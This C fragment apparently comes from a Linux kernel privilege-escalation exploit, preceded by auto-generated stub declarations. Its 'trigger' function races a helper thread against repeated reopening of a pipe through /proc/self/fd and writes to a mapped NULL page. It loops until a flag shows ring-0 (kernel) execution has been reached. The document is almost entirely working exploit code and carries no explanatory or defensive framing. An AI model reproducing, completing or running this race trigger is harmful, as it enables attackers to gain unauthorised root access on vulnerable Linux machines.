
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {int got_ring0; } ;


 int O_NONBLOCK ;
 int O_WRONLY ;
 int SIGPIPE ;
 int SIG_IGN ;
 int close (int) ;
 TYPE_1__* exp_state ;
 int fflush (int ) ;
 int fprintf (int ,char*) ;
 int go_go_speed_racer ;
 scalar_t__ is_old_kernel ;
 int open (char*,int) ;
 int* pipefd ;
 int signal (int ,int ) ;
 int sprintf (char*,char*,int) ;
 int start_thread (int ,int *) ;
 int stdout ;
 int write (int,char*,int) ;

int trigger(void)
{
        char buf[128];
        int fd;
    int i = 0;


    signal(SIGPIPE, SIG_IGN);

    start_thread(go_go_speed_racer, ((void*)0));

    fprintf(stdout, " [+] We'll let this go for a while if needed...\n");
    fflush(stdout);

        while (!exp_state->got_ring0 && i < 10000000) {
        fd = pipefd[1];
        sprintf(buf, "/proc/self/fd/%d", fd);
        fd = open(buf, O_WRONLY | O_NONBLOCK);
        if (fd >= 0) {

            *(unsigned int *)((void*)0) = is_old_kernel ? 0 : 1;
            write(fd, ".", 1);
            close(fd);
        }
        i++;
        }

    if (!exp_state->got_ring0) {
        fprintf(stdout, " [+] Failed to trigger the vulnerability.  Is this a single processor machine with CONFIG_PREEMPT_NONE=y?\n");
        return 0;
    }

    return 1;
}
